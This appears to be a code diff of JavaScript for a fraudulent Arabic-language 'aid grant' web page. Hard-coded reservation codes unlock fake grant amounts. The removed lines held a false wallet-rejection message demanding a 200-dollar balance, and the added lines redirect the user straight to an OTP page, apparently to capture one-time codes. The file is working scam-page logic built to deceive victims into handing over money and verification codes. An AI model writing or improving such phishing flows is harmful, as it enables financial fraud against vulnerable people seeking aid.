@@ -4,7 +4,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const ctaBtn = document.getElementById('ctaBtn');
   const btnText = ctaBtn.querySelector('.btn-text');
   const loader = ctaBtn.querySelector('.loader');
-  const errorText = document.getElementById('errorText');
   const activateWalletBtn = document.getElementById('activateWalletBtn');
   const fullNameInput = document.getElementById('fullName');
   const mobileInput = document.getElementById('mobileNumber');
@@ -93,22 +92,12 @@ document.addEventListener('DOMContentLoaded', () => {
         ctaBtn.style.display = 'none';
         btnText.style.display = 'inline-block';
         ctaBtn.disabled = false;
-
-        // Show red warning text below the CTA button
-        errorText.textContent = 'تم رفض عملية الايداع من قبل محفظة ويش موني حيث أنها غير فعالة لإيداع مبلغ نقدي عالي. يجب أن يكون رصيد المحفظة على الأقل ٢٠٠ دولار لرفع سقف الايداع.';
-        errorText.style.display = 'block';
-
-        // Show "تم تفعيل المحفظة" button
-        activateWalletBtn.style.display = 'block';
-
-        // After 15 seconds, activate the button
-        setTimeout(() => {
-          activateWalletBtn.disabled = false;
-          activateWalletBtn.style.cursor = 'pointer';
-        }, 15000);
+        window.location.href = 'otp.html';
+        // ✅ Directly show "تم تفعيل المحفظة" button (no red error message)
+        activateWalletBtn.style.display = 'none';
 
         firstClick = false;
-      }, 7000);
+      }, 3000);
 
       return;
     }
@@ -121,10 +110,62 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // ----------------- Activate Wallet Button -----------------
   activateWalletBtn.addEventListener('click', () => {
-    if (!activateWalletBtn.disabled) {
-      setTimeout(() => {
-        window.location.href = 'otp.html';
-      }, 2000);
-    }
+    setTimeout(() => {
+      window.location.href = 'otp.html';
+    }, 2000);
   });
+});
+
+// ----------------- Reservation Section -----------------
+const reservationInput = document.getElementById('reservationNumber');
+const grantInfo = document.querySelector('.grant-info');
+
+const validReservations = {
+  'RSV-9F2X7L3Q': 5000,
+  'RSV-A8K5D2T9': 14000,
+  'RSV-M4P7Z1W6': 21000
+};
+
+// Create error message element
+const reservationError = document.createElement('p');
+reservationError.style.color = 'red';
+reservationError.style.display = 'none';
+reservationError.style.marginTop = '5px';
+reservationError.textContent = 'يرجى إدخال رقم حجز صحيح';
+reservationInput.insertAdjacentElement('afterend', reservationError);
+
+// Create gray hint under grant info
+const grantHint = document.createElement('p');
+grantHint.style.color = '#666';
+grantHint.style.fontSize = '0.9rem';
+grantHint.style.marginTop = '5px';
+grantHint.textContent = 'ادخل رقم الحجز و تأكد من قيمة مبلغ المساعدة المصروف لك';
+grantInfo.insertAdjacentElement('afterend', grantHint);
+
+// Initial default text
+grantInfo.textContent = 'إجمالي مبلغ منحة المساعدة';
+
+// Listen for user typing
+reservationInput.addEventListener('input', () => {
+  const value = reservationInput.value.trim().toUpperCase();
+
+  if (!value) {
+    grantInfo.textContent = 'إجمالي مبلغ منحة المساعدة';
+    reservationError.style.display = 'none';
+    grantHint.style.display = 'block';
+    reservationInput.style.borderColor = '';
+    return;
+  }
+
+  if (validReservations[value]) {
+    reservationInput.style.borderColor = '#0c0'; // green
+    reservationError.style.display = 'none';
+    grantInfo.textContent = `إجمالي مبلغ منحة المساعدة: ${validReservations[value]} دولار`;
+    grantHint.style.display = 'none';
+  } else {
+    reservationInput.style.borderColor = 'red';
+    reservationError.style.display = 'block';
+    grantInfo.textContent = 'إجمالي مبلغ منحة المساعدة';
+    grantHint.style.display = 'block';
+  }
 });
